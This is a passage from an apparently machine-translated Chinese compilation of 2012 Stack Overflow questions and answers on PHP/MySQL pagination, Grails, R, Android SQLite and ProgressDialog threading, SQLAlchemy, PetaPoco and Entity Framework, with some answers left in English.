*   使用一个查询没有限制，并在 PHP 中计算结果集

有谁知道在 PHP 与 MySQL 中做这项工作的性能影响是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T19:30:47.980

PHP 在处理一些数据结构时非常有效，例如哈希表（常规数组在 php 中被视为哈希表）。效率不高的是在代码中访问这些结构。让我尝试在下面证明这一点。

假设您正在遍历数组中的所有项目进行比较并排除项目。我可以想到两种方法：

**1号：**

```
$arr = array_filter($arr2, function($item) { return $item > 2; }); 
```

`array_filter`在这种情况下，基本上会遍历所有 $arr2 项目，检查它们是否高于 2 并将其添加到 $arr，如果是的话。

**2号：**

```
$arr = array();
foreach ($arr2 => $item) {
    if ($item > 2) {
        $arr[] = $item;
    }
} 
```

在这里，您还遍历所有 $arr2 项目，检查它们是否高于 2 并将其添加到 $arr。它基本上`array_filter`是如何实现的。

这里最大的区别是：php 的编译库访问数据结构的速度比您的解释代码快得多，即使它是缓存的字节码。继续运行一些测试。调用`array_filter`一次比在代码中打开每个单独的项目要快。

请记住，这些只是教学示例，我并不是建议您通过遍历每个项目来过滤数组。我仅使用这些示例来说明在 PHP 中访问数据结构可能比让您的组件为您访问它们（在本例中为 mysql）要慢一些。仅此一项就代表了一些性能提升。

当您在 MySQL 子句中过滤某些内容时，您不会像我们之前所做的那样遍历每个表行并排除您不想要的那些。但是你已经知道了，我只是在重复你说的话。

这同样适用于对结果集进行排序、剪切和计数。MySQL 可能会比您在代码中更快地访问您的数据结构。

这里的最佳结果（会随着结果集的大小而略有不同，但我认为它可以增长，否则你不会想要分页）是将它留给 MySQL。

But running two queries may also not be the optimal result. If you could concatenate both queries (using a `UNION` clause, maybe), it would save you some overhead. It's ugly, yes, but *in theory* it should run faster (even though it may be indistinguishable, since PHP is quite efficient communicating with MySQL). You'd sacrifice much readability for an imperceptible performance gain.

**TL;DR:** I'd go for the first option you gave, running two queries.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T18:54:12.820

我认为返回完整的结果集，然后在 PHP 中计算它们，将是一个非常糟糕的主意。如果您需要向最终用户显示完整计数（即 Y 页的 X 页），则只需使用数据库查询获取记录计数，然后执行查询以获取分页数据。

# grails - Grails 包插件排除 jar 文件

> ID：14074194
> 
> 赞同：1
> 
> 时间：2012-12-28T18:42:19.367
> 
> 标签：grails, plugins, jar, package

全部，

我创建了一个插件，我将在多个项目中使用它。出于测试目的，我已包含连接到 Oracle 以测试此插件中的域类所需的 jar 文件。我不希望这个 jar 文件包含在打包的插件中（通过运行 package-plugin 完成）。jar 文件存在于 /lib 目录中。我该怎么做才能确保它被排除在打包的插件中？

感谢您的任何帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-29T17:42:43.540

`pluginExcludes`像[这样](http://svn.codehaus.org/grails-plugins/grails-ui-performance/tags/RELEASE_1_2_1/UiPerformanceGrailsPlugin.groovy)使用：

```
class UiPerformanceGrailsPlugin {

    String version = '1.2.1'
    String grailsVersion = '1.0 > *'
    Map dependsOn = [:]
    List pluginExcludes = [
        'lib/build/*.jar',
        'lib/easymock.jar',
        'src/groovy/com/studentsonly/grails/plugins/uiperformance/taglib/AbstractTaglibTest.groovy'
    ]
....
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T19:55:25.080

如果您通过 maven 包含 jar，则可以在构建配置中将导出设置为 false。

# r - 在 Deducer 的线性回归模型构建器中包含二次项

> ID：14074204
> 
> 赞同：2
> 
> 时间：2012-12-28T18:43:18.387
> 
> 标签：r, linear-regression, deducer

我应该在 Deducer 的线性回归模型生成器中做什么来生成如下公式

```
lm(ozone~temp*wind*rad+I(rad^2)+I(temp^2)+I(wind^2)) 
```

在`Outcomes`文本框中，我有`ozone`变量 and `temp`，`wind`并且`rad`在`Variables`文本框中。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-28T20:43:23.793

在选择线性模型后出现的对话框中，您将输入`temp`、`wind`和`rad`。现在您需要突出显示所有三个，然后选择 [Three-way] 按钮。（它将出现在 Model 列中`(temp+wind+rad)^3`，相当于 R 的公式语法中的 temp*wind*rad。）这将构建第一项。现在您需要依次突出显示每个变量，并为每个变量选择 [poly] 并输入“2”来构造二阶多项式项。

因为 poly 构造了一个正交多项式，所以这可能会也可能不会给你你想要的东西。为什么不跳过 GUI 的繁琐，直接在命令行输入呢？：

```
lm(ozone~temp*wind*rad+I(rad^2)+I(temp^2)+I(wind^2), data=environmental) 
```

我不确定您的真实数据框名称可能是什么，但它与作为`environmental`lattice 包的一部分的数据框具有相同的变量，所以这就是我的猜测。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-29T10:39:42.487

[我在这里](http://www.deducer.org/pmwiki/pmwiki.php?n=Main.LinearModel)找到了答案

`terms can be hand edited by double clicking on them`

# android - 无法使用 MATCH 功能

> ID：14074206
> 
> 赞同：1
> 
> 时间：2012-12-28T18:43:34.673
> 
> 标签：android, sql, search

我在下面生成的 SQL 中有语法错误，我认为它在`getContactMatches()`方法中：

```
public class DatabaseTable {
private static final String TAG = "ContactsDatabase";

//The columns we'll include in the contacts table
public static final String COL_ID = "_id";
public static final String COL_NAME = "NAME";
public static final String COL_EMAIL = "EMAIL";

private static final String DATABASE_NAME = "CONTACT";
private static final String DATABASE_TABLE = "contactsTable";
private static final int DATABASE_VERSION = 4;
private Context ourContext;
private DbHelper DBHelper;
private SQLiteDatabase db;
private static final String DATABASE_CREATE = 
        "CREATE TABLE " + DATABASE_TABLE + " (" +
         COL_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
         COL_NAME + " TEXT NOT NULL, " + 
         COL_EMAIL + " TEXT NOT NULL);";

    private static class DbHelper extends SQLiteOpenHelper {

        DbHelper(Context context) {
            super(context, DATABASE_NAME, null, DATABASE_VERSION);
        }

        public void onCreate(SQLiteDatabase db) {
            try {
                db.execSQL(DATABASE_CREATE);
            } catch (SQLException e) {
                e.printStackTrace();
            }
        }

        @Override
        public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
            db.execSQL("DROP TABLE IF EXISTS " + DATABASE_TABLE);
            onCreate(db);
        }
    }

        public DatabaseTable(Context context) {
            ourContext = context;
        }

        public DatabaseTable open() throws SQLException {
            DBHelper = new DbHelper(ourContext);
            db = DBHelper.getWritableDatabase();
            return this;
        }

        public void close() {
            DBHelper.close();
        }

        public long insertContact(String name, String email) {
            ContentValues initialValues = new ContentValues();
            initialValues.put(COL_NAME, name);
            initialValues.put(COL_EMAIL, email);
            return db.insert(DATABASE_TABLE, null, initialValues);
        }

        public String getData()
        {
            String[] columns = new String[]{COL_ID, COL_NAME, COL_EMAIL};
            Cursor c = db.query(DATABASE_TABLE, columns, null, null, null, null, null);
            String data = "";
            int id = c.getColumnIndex(COL_ID);
            int colname = c.getColumnIndex(COL_NAME);
            int colemail = c.getColumnIndex(COL_EMAIL);
            for(c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) {
                data = data + c.getString(id) + " " + c.getString(colname) + " " + c.getString(colemail) + "\n";
            }
            return data;
        }

        public Cursor getContactMatches(String query, String[] columns) {
            String selection = COL_NAME + " MATCH ?";
            String[] selectionArgs = new String[] {query+"*"};

            return query(selection, selectionArgs, columns);
        }

        private Cursor query(String selection, String[] selectionArgs, String[] columns) {
            DBHelper = new DbHelper(ourContext);
            SQLiteQueryBuilder build = new SQLiteQueryBuilder();
            build.setTables(DATABASE_TABLE);

            Cursor cursor = build.query(DBHelper.getReadableDatabase(),
                    columns, selection, selectionArgs, null, null, null);

            if (cursor == null) {
                return null;
            }

            return cursor;
        }

        public int cursorLength(Cursor cursor) {
            int x = 0;
            for(cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext())
                x = x + 1;
            return x;
        } 
```

日志输出显示：

```
12-28 12:39:13.254: E/SQLiteLog(565): (1) statement aborts at 7: [SELECT * FROM contactsTable WHERE (NAME MATCH ?)] unable to use function MATCH in the requested context
12-28 12:39:13.284: E/SQLiteQuery(565): exception: unable to use function MATCH in the requested context (code 1); query: SELECT * FROM contactsTable WHERE (NAME MATCH ?) 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-12-28T18:59:51.727

[`MATCH`](http://www.sqlite.org/fts3.html#section_3)仅对虚拟 FTS 表有效。您需要[`LIKE`](http://www.sqlite.org/lang_expr.html#like)在常规表中使用。

# python - 可以使用模型中的属性订购吗？

> ID：14074207
> 
> 赞同：5
> 
> 时间：2012-12-28T18:43:54.310
> 
> 标签：python, sqlalchemy

可以使用模型中的属性订购吗？

```
class PlayerModel(Base):
    __tablename__ = 'players'
    alliances_id = Column(Integer, ForeignKey('alliances.id'), nullable=True)
    alliance = relationship('AllianceModel')
    username = Column(String(30), nullable=False)
    wins = Column(Integer, default=0, nullable=False)
    defeats = Column(Integer, default=0, nullable=False)

    @property
    def score(self):
        number = self.wins + self.defeats
        if number:
            return self.wins / number
        return 0 
```

在查询中

```
 `for player in session.query(PlayerModel).order_by(PlayerModel.wins+PlayerModel.defeats):` 
```

它可以工作，但是当我输入时 id 不起作用

```
session.query(PlayerModel).order_by(PlayerModel.wins+PlayerModel.score):` 
```

它报告错误期望 SQL 字符串。是否可以按 desc 中的属性排序？（我可以加载所有并在应用程序级别进行排序，但如果有很多记录，那就不好了。其他肮脏的解决方案是提交分数并触发，但顺序和属性似乎更优雅，可能吗？）

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-30T23:53:37.260

是的，您需要使用一个称为[混合属性](http://docs.sqlalchemy.org/en/latest/orm/extensions/hybrid.html?highlight=hybrid%20attributes#module-sqlalchemy.ext.hybrid)的功能。表达式需要用 Python 逻辑和 SQL 表达式逻辑来表述：

```
from sqlalchemy.ext.hybrid import hybrid_property
from sqlalchemy import case

class PlayerModel(Base):
    __tablename__ = 'players'
    alliances_id = Column(Integer, ForeignKey('alliances.id'), nullable=True)
    alliance = relationship('AllianceModel')
    username = Column(String(30), nullable=False)
    wins = Column(Integer, default=0, nullable=False)
    defeats = Column(Integer, default=0, nullable=False)

    @hybrid_property
    def score(self):
        number = self.wins + self.defeats
        if number:
            return self.wins / number
        return 0

    @score.expression
    def score(cls):
        number = cls.wins + cls.defeats
        return case([(number > 0, cls.wins / number)], else_ = 0) 
```

# c# - PetaPoco.relation 扩展获取多对一默认情况下会给我不需要的孩子

> ID：14074210
> 
> 赞同：0
> 
> 时间：2012-12-28T18:44:08.150
> 
> 标签：c#, petapoco, npoco

例如，我有两个表，例如：

```
CREATE TABLE [dbo].[Parent](
    [Id] [int] NOT NULL,
    [Name] [nvarchar](50) NOT NULL
) ON [PRIMARY]

GO

BEGIN TRANSACTION;
INSERT INTO [dbo].[Parent]([Id], [Name])
SELECT 1, N'First parent' UNION ALL
SELECT 2, N'Second parent' UNION ALL
SELECT 3, N'Parent with no childrens'
COMMIT;

CREATE TABLE [dbo].[Child](
    [Id] [int] NOT NULL,
    [ParentId] [int] NOT NULL,
    [Name] [nvarchar](50) NOT NULL
) ON [PRIMARY]

GO

BEGIN TRANSACTION;
INSERT INTO [dbo].[Child]([Id], [ParentId], [Name])
SELECT 1, 1, N'First child' UNION ALL
SELECT 2, 2, N'Second child'
COMMIT; 
```

然后是两个 c# 类，如：

```
public class Parent
{
    public int Id { get; set; }
    public string Name { get; set; }
    public IList<Child> Children { get; set; }
}

public class Child
{
    public int Id { get; set; }
    public int ParentId { get; set; }
    public string Name { get; set; }
} 
```

当我使用 Petapoco 和关系扩展时（其中 db 是 Petapocos 数据库对象的一个​​实例）：

```
var parents = db.FetchOneToMany<Parent, Child>(p => p.Id, "SELECT * FROM Parent AS p LEFT JOIN Child AS c ON p.Id = c.ParentId"); 
```

我得到了父母的预期结果，我的列表中的三个项目具有正确的 ID，但没有正确的孩子。前两个对于他们连接的孩子是正确的，“第一个孩子”和“第二个孩子”但是数据库中没有孩子的第三个父母会得到一个孩子的默认实例。我的意思是第三个父母有一个计数为 1 的孩子的集合。并且该列表包含一个只有默认值的孩子。`Id = 0, Name = NULL, ParentId = 0`. 这不是我想要的。我希望该集合不包含任何孩子。我看到的替代方法是集合为空或 IList 的实例但没有项目。

我做错了什么，我该如何纠正？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T05:05:09.623

应该有一个需要第二个 lambda 的重载。如果没有，那么您应该可以使用它的这个版本。 [https://github.com/schotime/NPoco/blob/dev2.0/src/NPoco/RelationExtensions.cs](https://github.com/schotime/NPoco/blob/dev2.0/src/NPoco/RelationExtensions.cs)

您可能必须将其更改为`IDatabase`，`Database`但它应该可以正常工作。

否则调用：

```
db.FetchOneToMany<Parent, Child>(p => p.Id, c => c.Id, "your sql here"); 
```

第二个 lambda 是子表的主键。

# c# - 当我创建一个与地址有关系（多对多）的事件时，我收到错误：对象引用未设置为对象的实例

> ID：14074213
> 
> 赞同：1
> 
> 时间：2012-12-28T18:44:17.870
> 
> 标签：c#, asp.net-mvc-4, visual-studio-2012, many-to-many, object-reference

> **可能重复：**
> [.NET 中的 NullReferenceException 是什么？](https://stackoverflow.com/questions/4660142/what-is-a-nullreferenceexception-in-net)

我有一个与地址有关系的类事件，这是一个多对多的关系。当我尝试将地址添加到我的事件时，它会给出错误：

你调用的对象是空的。

这是我的代码：

事件类

```
 public class Event
  {
        public int EventID { get; set; }
        public string EventName { get; set; }
        public string EventImage { get; set; }
        public DateTime EventDate { get; set; }    
        public int ItemID { get; set; }
        public virtual Item Item { get; set; }

        public virtual ICollection<Address> Addresses { get; set; }
  } 
```

地址等级

```
public class Address
{

    public int Address_id { get; set; }
    public string Address_street { get; set; }
    public int Address_housenumber { get; set; }
    public string Address_bus { get; set; }
    public Nullable<int> Messages_id { get; set; }

    public virtual ICollection<Event> Events { get; set; }
} 
```

语境

```
 public class SocialGEOContext : DbContext
  {
    public DbSet<Event> Events { get; set; }
    public DbSet<Address> Addresses { get; set; }
    public DbSet<Item> Items { get; set; }

 protected override void OnModelCreating(DbModelBuilder modelBuilder)
    {

        modelBuilder.Conventions.Remove<PluralizingTableNameConvention>();

      //EVENTS
        modelBuilder.Entity<Event>().HasKey(t => t.EventID);
        modelBuilder.Entity<Event>().ToTable("events", "geodatabase");
        modelBuilder.Entity<Event>().Property(t => t.EventID).HasColumnName("event_id");
        modelBuilder.Entity<Event>().Property(t => t.EventName).HasColumnName("event_name").IsRequired().IsUnicode(false).HasMaxLength(64);
        modelBuilder.Entity<Event>().Property(t => t.EventDate).HasColumnName("event_date");
        modelBuilder.Entity<Event>().Property(t => t.EventImage).HasColumnName("event_image").IsUnicode(false).HasMaxLength(128);
        modelBuilder.Entity<Event>().Property(t => t.ItemID).HasColumnName("item_id");
        modelBuilder.Entity<Event>().HasRequired(t => t.Item).WithMany(t => t.Events).HasForeignKey(d => d.ItemID);

//ADDRESSES
        modelBuilder.Entity<Address>().HasKey(t => t.Address_id);
        modelBuilder.Entity<Address>().ToTable("addresses", "geodatabase");
        modelBuilder.Entity<Address>().Property(t => t.Address_id).HasColumnName("address_id");
        modelBuilder.Entity<Address>().Property(t => t.Address_street).HasColumnName("address_street").IsRequired().IsUnicode(false).HasMaxLength(128);
        modelBuilder.Entity<Address>().Property(t => t.Address_housenumber).HasColumnName("address_housenumber");
        modelBuilder.Entity<Address>().Property(t => t.Address_bus).HasColumnName("address_bus").IsUnicode(false).IsFixedLength().HasMaxLength(1);
        //modelBuilder.Entity<Address>().Property(t => t.messages_id).HasColumnName("messages_id");
        //modelBuilder.Entity<Address>().HasOptional(t => t.message).WithMany(t => t.addresses).HasForeignKey(d => d.messages_id);
        modelBuilder.Entity<Address>()
            .HasMany(t => t.Events)
            .WithMany(t => t.Addresses)
            .Map(m =>
            {
                m.ToTable("event_has_address", "geodatabase");
                m.MapLeftKey("address_id");
                m.MapRightKey("event_id");
            }); 
```

事件控制器

```
 // POST: /Event/Create
        [HttpPost]
        public ActionResult Create(EventAddressViewModel ViewModel)
        {
            if (ModelState.IsValid)
            {
                Item viewItem = ViewModel.Item;
                Address viewAddress = ViewModel.Address;
                Event viewEvent = ViewModel.Event;

                //ADD ITEM
                viewItem.ItemCreateddate = DateTime.Now;
                db.Items.Add(viewItem);
                //ADD EVENT
                viewEvent.Item = viewItem;
                db.Addresses.Add(viewAddress);
                db.SaveChanges();
                Address addres1 = db.Addresses.Find(viewAddress.Address_id);
                viewEvent.Addresses.Add(addres1);
                db.Events.Add(viewEvent);

                db.SaveChanges();

                return RedirectToAction("Index");
            }
            return View(ViewModel);
        } 
```

在我的控制器上加上“viewEvent.Addresses.Add(address);” 我得到了错误。当我将鼠标悬停在地址上时，它具有正确的值，但它一直说对象引用未设置...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-28T18:50:03.600

你没有实例化你的`ICollection`. 当您尝试添加地址时，您的`Addresses`变量为 null，这会导致`NullReferenceException`. 将其初始化为具体类型：

```
if(viewEvent.Addresses == null)
{
    viewEvent.Addresses = new List<Address>();
}
viewEvent.Addresses.Add(addres1); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-28T18:49:39.420

将此行添加到失败的行上方：

```
viewEvent.Addresses = new List<Address>(); 
```

问题是您目前没有已初始化的地址列表，因此您需要先构建一个，然后再添加。

# javascript - 如何在 Google Apps Script 中使用 Dictionary javascript 类？

> ID：14074217
> 
> 赞同：3
> 
> 时间：2012-12-28T18:44:35.627
> 
> 标签：javascript, object, dictionary, google-apps-script

我正在尝试在 Google Apps 脚本中制作和使用 Dictionary 对象。之前，我第一次为我的脚本使用了一个很长的 switch 语句，当我将它提交到 Gallery 时，批准它的人问我为什么不使用 Javascript Dictionary 对象。我研究了如何使用 Dictionary 对象，但现在我的脚本无法工作，因为 Google Apps 脚本不理解该命令：

```
Components.utils.import("resource://gre/modules/Dict.jsm"); 
```

此“导入”代码行直接从此 Javascript 参考网页复制：http: [//developer.mozilla.org/en-US/docs/Mozilla/JavaScript_code_modules/Dict.jsm](http://developer.mozilla.org/en-US/docs/Mozilla/JavaScript_code_modules/Dict.jsm)

如何包含使其工作所需的这个 javascript 库，或者 Google Apps 脚本替代 javascript Dictionary 对象是什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-28T18:53:50.450

任何时候你有一个`switch`看起来像这样的声明：

```
switch ( someValue ) {
case "string1": doSomething( valueForString1 ); break;
case "string2": doSomething( valueForString2 ); break;
// ... 
case "stringN": doSomething( valueForStringN ); break;
} 
```

您可以将其替换为：

```
var dict = {
  "string1": valueForString1,
  "string2": valueForString2,
  // ...
  "stringN": valueForStringN
};

doSomething( dict[ someValue ] ); 
```

当然，这些值可以是任何东西：字符串、数字、对象、函数等等。您可能想检查字典中是否缺少值：

```
if (dict[someValue]) doSomething(dict[someValue]); 
```

# entity-framework - 如何将我的存储库从 EF 代码优先切换到使用 EDMX 实体模型？

> ID：14074218
> 
> 赞同：0
> 
> 时间：2012-12-28T18:44:41.810
> 
> 标签：entity-framework, code-first, edmx

目前我的存储库包含以下代码：

```
public interface IRepository<T> where T : class
{
    T Get(int id);
    IQueryable<T> GetAll();
    IQueryable<T> Where(Expression<Func<T, bool>> predicate);
    IQueryable<T> Query();
    void Add(T entity);
    void Remove(T entity);
    void Save();
}

public class Repository<T> : IRepository<T> where T : class
    {
        private readonly IContextProvider  _ctxProvider;
        protected BaseModelContext _ctx
        {
            get
            {
                return _ctxProvider.DataContext;
            }
        }

        public Repository(IContextProvider ctx)
        {
            _ctxProvider = ctx;
        }

        public T Get(int id)
        {
            return _ctx.Set<T>().Find(id);
        }

        public IQueryable<T> GetAll()
        {
            return _ctx.Set<T>();
        }

        public IQueryable<T> Where(Expression<Func<T, bool>> predicate)
        {
            return _ctx.Set<T>().Where(predicate);
        }

        public void Add(T entity)
        {
            _ctx.Set<T>().Add(entity);
        }

        public void Remove(T entity)
        {            
            _ctx.Set<T>().Remove(entity);
        }

        public IQueryable<T> Query()
        {
            return _ctx.Set<T>().AsQueryable();
        }

        public IQueryable<T> Eager(string path)
        {
            return _ctx.Set<T>().Include(path);
        }

        public void Save()
        {
            _ctx.SaveChanges();
        }
    } 
```

我已经从数据库创建了我的 EDMX 模型，但是我注意到您将在哪里使用 _ctx.Set 来针对每个类模式的代码优先表进行模板化，Set() 方法在由创建的实体上不可用生成的 .edmx 文件。我原以为 EF 可以很容易地在这两种类型之间切换。我是否必须重新编写我的存储库类才能使用 EDMX 模型？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-29T19:37:45.597

默认情况下，模型优先和数据库优先方法 VS2010 生成基于 ObjectContext 的上下文和基于 EntityObject 的实体。这在 VS2012 中发生了变化，默认情况下将生成 POCO 实体和基于 DbContext 的上下文。CodeFirst 使用 POCO 实体和基于 DbContext 的上下文，符合 VS2012 但不符合 VS2010。然而，即使使用 VS2010，您也可以生成 DbContext 和 POCO 实体。首先，右键单击设计器表面并在属性中将代码生成策略从默认更改为无。然后右键单击您的项目并“添加新项目”。点击左侧的“在线”。您可以在搜索对话框中键入 DbContext。选择“EF 4.x DbContext Generator for C#”。这会将 T4 模板添加到您的项目中，该模板将从您的 edmx 文件生成基于 DbContext 的上下文和 POCO 实体。

# android - 在显示/关闭之间没有显示 JNI 本机调用的进度对话框

> ID：14074221
> 
> 赞同：0
> 
> 时间：2012-12-28T18:44:48.243
> 
> 标签：android, android-ndk, java-native-interface, progressdialog

我正在尝试使用旋转的 ProgressDialog 来告诉用户程序何时运行。我已经`ProgressDialog`正确地显示和关闭了，但是只有在调用之间有简单的代码时。我目前正在`ProgressDialog`我的`onCreate`方法中初始化，然后在按下按钮时，将显示对话框，然后遍历大量代码，然后是关闭调用。代码全部正确执行，但对话框从未显示。

```
public class Waves extends Activity {
    private ProgressDialog pd;
    public void onCreate( Bundle savedInstanceState ) {
        super.onCreate( savedInstanceState );
        pd = new ProgressDialog( this );  
        pd.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        pd.setMessage("Reading...");
        pd.setCancelable(false);
        setContentView( R.layout.waves );

        readButton = (Button) findViewById( R.id.readButton );
        readButton.setOnClickListener( new OnClickListener() {

        public void onClick(View arg0) {
            pd.show( );
            if( myService.getState() != 3 ) {
                myService.setHandler( mHandler );
                myService.connect( MainMenu.previousDevice, true );
            } else {
                readWaves();
            }
        }
    });

} 
```

readWaves 如下所示。在 readWaves 的末尾`pd.dismiss()`是调用的地方。readWaves 中有许多函数调用，我将尝试在不冗长的情况下展示它们。

```
private void readWaves() {
    if( spinnerChoice == 0 ) {
        Log.i( "IN IF", "IN IF" );
        // Diff Voltage
        waveResults = RelayAPIModel.NativeCalls.GetWavesJava( RelayAPIModel.WAVES_V );
    } else {
        // Current 
        waveResults = RelayAPIModel.NativeCalls.GetWavesJava( RelayAPIModel.WAVES_I );
    }

    updateGraph();
    netV1Check.setChecked( true );
    netV2Check.setChecked( true );
    netV3Check.setChecked( true );
    vdi1Check.setChecked( true );
    vdi2Check.setChecked( true );
    vdi3Check.setChecked( true );
    hasRead = true;
    pd.dismiss();
} 
```

该`updateGraph()`调用对图表进行了简单的修饰，所以我认为问题不存在。`RelayAPIModel.NativeCalls.GetWavesJava()`电话是我认为问题出现的地方。

`GetWavesJava()`是一个用 C 语言编写的函数，位于我的本地库中。在 GetWavesJava() 中，有大量对其他本机 C 函数的函数调用，以及对我的应用程序 Java 端的大量函数调用。

这听起来很愚蠢，但原因是 C 中的本机库是需要使用的现有库。但是，它不支持Android的蓝牙功能，所以所有通过蓝牙发送/接收数据的方法都需要在Java端进行描述。

总共有六个用于 I/O 流的 Java 函数，它们在整个应用程序中被多次使用，而不仅仅是这一次调用。我考虑放入`pd.dismiss()`其中一个函数，但只需要 1% 的时间调用这些函数。

有谁知道确保我的对话框在本机函数调用之前显示并在之后停止的解决方案？

[这是一个类似的 SO 问题，但不完全相同](https://stackoverflow.com/questions/2798443/android-progressdialog-doesnt-show)

**编辑 ：**

使用下面的答案，这是我的代码：

```
readButton = (Button) findViewById( R.id.readButton );
readButton.setOnClickListener( new OnClickListener() {

        public void onClick(View arg0) {

            pd.show( );
            Thread export = new Thread() {  
                 public void run() {
                        if( myService.getState() != 3 ) {
                            Log.i( "myService", "12222" );
                            myService.setHandler( mHandler );
                            myService.connect( MainMenu.previousDevice, true );
                        } else {
                            Log.i("myService",  "32222" );
                            readWaves();
                            Log.i( "myService", "42222" );
                        }

                 mHandler.obtainMessage(MainMenu.READ_FINISHED );
                 }
            };
            export.start();
                        }
    }); 
```

`Log( 42222 )`永远达不到。微调器确实出现了，但程序会在几秒钟内崩溃并重新启动。我已`.sendToTarget()`在该`mHandler.obtainMessage()`行中添加，但这会导致没有微调器出现，并且程序崩溃。

**编辑 2：**

我还想补充一点，该`readWaves`函数使用现有的正在运行的线程来执行。我不确定这是否有什么不同

**编辑 3：**

在这里，我更新了初始提交的第二个代码块。使用此代码，进度对话框永远不会显示自己。代码执行时涉及的所有代码`ProgressDialog`根本不存在。

```
private void readWaves() {
    if( spinnerChoice == 0 ) {
        Log.i( "IN IF", "IN IF" );
        // Diff Voltage
        waveResults = RelayAPIModel.NativeCalls.GetWavesJava( RelayAPIModel.WAVES_V );
    } else {
        // Current 
        waveResults = RelayAPIModel.NativeCalls.GetWavesJava( RelayAPIModel.WAVES_I );
    }

    pd.dismiss();
    updateGraph();
    netV1Check.setChecked( true );
    netV2Check.setChecked( true );
    netV3Check.setChecked( true );
    vdi1Check.setChecked( true );
    vdi2Check.setChecked( true );
    vdi3Check.setChecked( true );
    hasRead = true; 
```

}

**编辑 4：** 这是我最近的代码。ProgressDialog 显示在我想要的位置，但微调器不旋转。我曾尝试替换`pd.dismiss()`并`pd.hide()`稍后`pd.dismiss()`放入代码，但这会导致对话框始终停留在屏幕上。自从`.setCancelable(false)`被使用后，我永远无法退出它。我还采用了`pd`onClickListener 外部的声明，因为我无法将参数传递`this`给. 我不记得我可以传递给它什么来让它工作，我试过了，但它们都没有奏效。`ProgressDialog``OnClickListener``getApplicationContext()``ClassName.java``ClassName.class`

```
 readButton = (Button) findViewById( R.id.readButton );
    final ProgressDialog pd = new ProgressDialog( this );  
    readButton.setOnClickListener( new OnClickListener() {
        public void onClick(View arg0) {
            pd.setProgressStyle(ProgressDialog.STYLE_SPINNER);
            pd.setMessage("Reading...");
            pd.setCancelable(false);            
            pd.show( );

            Thread export = new Thread() {  
                 public void run() {
                        if( myService.getState() != 3 ) {
                            Log.i( "myService", "12222" ); 
                            myService.setHandler( mHandler );
                            myService.connect( MainMenu.previousDevice, true );
                        } else {
                            runOnUiThread(new Runnable() {
                                public void run() {
                                    readWaves();
                                }
                            });
                        }
                 mHandler.obtainMessage(MainMenu.READ_FINISHED ).sendToTarget();
                 pd.dismiss();
                 }
            };
            export.start(); 
```

**编辑 5：**试图让微调器出现在`if`语句中：

```
 readButton = (Button) findViewById( R.id.readButton );
    readButton.setOnClickListener( new OnClickListener() {
        public void onClick(View arg0) {
            final ProgressDialog pd = new ProgressDialog( Waves.this );  
            pd.setProgressStyle(ProgressDialog.STYLE_SPINNER);
            pd.setMessage("Reading...");
            pd.setCancelable(false);            
            pd.show( );

            Thread export = new Thread() {  
                 public void run() {
                        if( myService.getState() != 3 ) {
                            Log.i( "myService", "12222" ); 
                            myService.setHandler( mHandler );
                            runOnUiThread( new Runnable() {
                                public void run() {
                                    myService.connect( MainMenu.previousDevice, true );
                                }
                            });
                        } else {
                            runOnUiThread(new Runnable() {
                                public void run() {
                                    readWaves();
                                }
                            });
                        }
                 mHandler.obtainMessage(MainMenu.READ_FINISHED ).sendToTarget();
                 pd.dismiss();
                 }
            };
            export.start(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-03T19:29:04.140

鉴于您已经提到`All UI is updated within updateGraph()`，您的代码（来自第二次编辑，大部分是正确的）正在抛出`CalledFromWrongThreadException`. 您的`updateGraph()`方法是从`readWaves()`方法中调用的，而该方法又是从`new Thread()`您创建的方法中调用的。这意味着您正在尝试从不是这些视图的实际父级的 Thread 更新某些视图。

尝试：

```
final ProgressDialog pd = new ProgressDialog( this );  
pd.setProgressStyle(ProgressDialog.STYLE_SPINNER);
pd.setMessage("Reading...");
pd.setCancelable(false);            
pd.show( );
Thread export = new Thread() {  
    public void run() {
        if( myService.getState() != 3 ) {
            Log.i( "myService", "12222" );
                myService.setHandler( mHandler );
                myService.connect( MainMenu.previousDevice, true );
        } else {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    readWaves();
                }
            });
            pd.dismiss();
        }
        mHandler.obtainMessage(MainMenu.READ_FINISHED );
    }
}.start(); 
```

该`runOnUiThread()`调用确保`updateGraph()`从内部`readWaves()`完成的 UI 更新在 UI 线程上完成。哦，你可以删除`pd.dismiss()`.`readWaves()`

**编辑：**对于不旋转的微调器，这里有一个[问题](https://stackoverflow.com/q/3119676/1782481)。解决方案说：

> 如果您关闭 Dialog，则不得再次显示相同的实例。要么创建一个新的，要么使用 hide() 而不是 dismiss()。使用 hide() 时，您仍然需要在不再需要时将其 dismiss()。

**编辑**：

另请注意，在上面的代码中，我已将 ProgressDialog 的声明（在您的情况下是全局的）移动到`onClick()`事件处理程序的本地上下文中。这意味着为新的单击事件创建了一个新的 ProgressDialog。如果你以任何方式泄露了这种模式，请告诉我。

> 我不记得我可以传递给它什么来使它工作，我尝试了 getApplicationContext()、ClassName.java 和 ClassName.class，但它们都没有工作。

试试`ClassName.this`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-28T18:52:56.440

这可能是异步问题，尝试显示对话然后使用异步处理程序来触发长任务（您的本机调用）。我也必须处理这个问题，因为有时像“解雇”/“显示”这样的事情会发布到消息队列中，然后你用长任务阻止它。尝试将线程用于长任务并且不要阻塞 UI

在这里查看我的博客文章：

